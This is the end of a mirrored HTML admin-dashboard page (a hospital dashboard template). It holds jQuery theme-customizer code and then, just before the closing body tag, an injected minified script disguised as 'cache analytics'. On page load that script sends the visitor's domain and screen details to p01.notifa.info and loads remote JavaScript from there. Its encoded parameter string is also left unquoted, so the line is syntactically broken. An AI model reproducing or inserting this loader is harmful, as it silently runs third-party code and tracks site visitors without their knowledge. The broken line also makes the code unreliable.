 <!-- Required Js -->
 <script src="assets/js/vendor-all.min.js"></script>
    <script src="assets/js/plugins/bootstrap.min.js"></script>
    <script src="assets/js/plugins/feather.min.js"></script>
    <script src="assets/js/pcoded.min.js"></script>
    <script src="../../../../cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
    <script src="assets/js/plugins/clipboard.min.js"></script>
    <script src="assets/js/uikit.min.js"></script>

<script src="assets/js/plugins/jquery.dataTables.min.js"></script>
<script src="assets/js/plugins/dataTables.bootstrap4.min.js"></script>
<!-- Apex Chart -->
<script src="assets/js/plugins/apexcharts.min.js"></script>


<script>
    // header option
    $('#pct-toggler').on('click', function() {
        $('.pct-customizer').toggleClass('active');

    });
    // header option
    $('#cust-sidebrand').change(function() {
        if ($(this).is(":checked")) {
            $('.theme-color.brand-color').removeClass('d-none');
            $('.m-header').addClass('bg-dark');
        } else {
            $('.m-header').removeClassPrefix('bg-');
            $('.m-header > .b-brand > .logo-lg').attr('src', 'assets/images/logo-dark.svg');
            $('.theme-color.brand-color').addClass('d-none');
        }
    });
    // Header Color
    $('.brand-color > a').on('click', function() {
        var temp = $(this).attr('data-value');
        // $('.header-color > a').removeClass('active');
        // $('.pcoded-header').removeClassPrefix('brand-');
        // $(this).addClass('active');
        if (temp == "bg-default") {
            $('.m-header').removeClassPrefix('bg-');
        } else {
            $('.m-header').removeClassPrefix('bg-');
            $('.m-header > .b-brand > .logo-lg').attr('src', 'assets/images/logo.svg');
            $('.m-header').addClass(temp);
        }
    });
    // Header Color
    $('.header-color > a').on('click', function() {
        var temp = $(this).attr('data-value');
        // $('.header-color > a').removeClass('active');
        // $('.pcoded-header').removeClassPrefix('brand-');
        // $(this).addClass('active');
        if (temp == "bg-default") {
            $('.pc-header').removeClassPrefix('bg-');
        } else {
            $('.pc-header').removeClassPrefix('bg-');
            $('.pc-header').addClass(temp);
        }
    });
    // sidebar option
    $('#cust-sidebar').change(function() {
        if ($(this).is(":checked")) {
            $('.pc-sidebar').addClass('light-sidebar');
            $('.pc-horizontal .topbar').addClass('light-sidebar');
            // $('.m-header > .b-brand > .logo-lg').attr('src', 'assets/images/logo-dark.svg');
        } else {
            $('.pc-sidebar').removeClass('light-sidebar');
            $('.pc-horizontal .topbar').removeClass('light-sidebar');
            // $('.m-header > .b-brand > .logo-lg').attr('src', 'assets/images/logo.svg');
        }
    });
    $.fn.removeClassPrefix = function(prefix) {
        this.each(function(i, it) {
            var classes = it.className.split(" ").map(function(item) {
                return item.indexOf(prefix) === 0 ? "" : item;
            });
            it.className = classes.join(" ");
        });
        return this;
    };
</script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + 4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncX0a%2fO%2bSuKo8qdIG4gCyLviYbtD%2bWPWu4CHke3Sj02BwRJ9Eqoq9zLnQZ1Z3WgZjtdAaT7UKQwcY4ySrvTMRTJYCSfeQzDITjiHcgtcCb2T7d38lnDcBjPFzo3FnlPz55IQI6d68CW0sCMye7C2CbIT9ldzCxMXZpcxjgEy%2fUVGYZgRSxhRjtTQbeBOcb01GK6sQiiEN%2beONTw7pncMe%2bqKoih6SudDcHfnvR8z6vXeGoevWQqYV5i4sOcnomNJb4RukGGIRO5hn20kiSCOCtZlIz0uIlZK7IS%2b7yPTSTaM%2fc%2fSWMEsNXDCz1s4PI3Hu%2bID3ZmYvwLiwF4s1LVYzM6JTRUjbofCpkTjsweRvgM09RQk5IZTRzLQFgSEabmfZ7Ap4I0NSi3BVqiaV0Vhef7c7PvOb74P5Ya5auXKfpON%2buk7%2bpd6KUq8CvkkodR9k0PCYf6MzrwTr4LpV7SPVHMfZS2UVz7TXxIc%2fOpqP8RytZFF5rK3HuLla5SSTlAcZ6Q%2bcJJbLc31Xo%3d + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>


<!-- Mirrored from html.phoenixcoded.net/nextro-able/bootstrap/default/hospital-dashboard.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 10 Aug 2020 02:12:54 GMT -->
</html>
